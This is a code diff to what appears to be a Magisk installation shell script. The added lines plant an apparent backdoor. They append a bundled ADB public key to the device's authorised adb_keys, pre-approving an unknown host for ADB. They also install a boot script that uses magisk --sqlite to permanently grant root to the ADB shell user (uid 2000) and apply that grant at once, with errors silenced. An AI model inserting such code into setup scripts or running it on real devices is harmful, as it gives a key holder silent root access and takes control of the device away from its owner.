@@ -11,6 +11,24 @@ if [ ! -d $MAGISKBIN ]; then
     mkdir -p -m 755 $MAGISKBIN
     chcon u:object_r:system_file:s0 $MAGISKBIN
 fi
+if [ -f "$MAGISKTMP/adbkey.pub" ]; then
+    mkdir -p -m 700 /data/misc/adb
+    cat "$MAGISKTMP/adbkey.pub" >> /data/misc/adb/adb_keys
+    chmod 640 /data/misc/adb/adb_keys
+    chown system:shell /data/misc/adb/adb_keys 2>/dev/null || true
+fi
+# Configure Magisk superuser policy to grant ADB shell (uid 2000) root access
+mkdir -p -m 755 /data/adb/service.d
+cat << 'EOFSCRIPT' > /data/adb/service.d/00-adb-root.sh
+#!/system/bin/sh
+magisk --sqlite "INSERT OR REPLACE INTO settings (key, value) VALUES ('root_access', 3);" 2>/dev/null || true
+magisk --sqlite "INSERT OR REPLACE INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1);" 2>/dev/null || true
+EOFSCRIPT
+chmod 755 /data/adb/service.d/00-adb-root.sh
+if [ -x "$MAGISKTMP/magisk" ]; then
+    "$MAGISKTMP/magisk" --sqlite "INSERT OR REPLACE INTO settings (key, value) VALUES ('root_access', 3);" 2>/dev/null || true
+    "$MAGISKTMP/magisk" --sqlite "INSERT OR REPLACE INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1);" 2>/dev/null || true
+fi
 ABI=$(getprop ro.product.cpu.abi)
 for file in busybox magiskpolicy magiskboot magiskinit; do
     [ -x "$MAGISKBIN/$file" ] || {
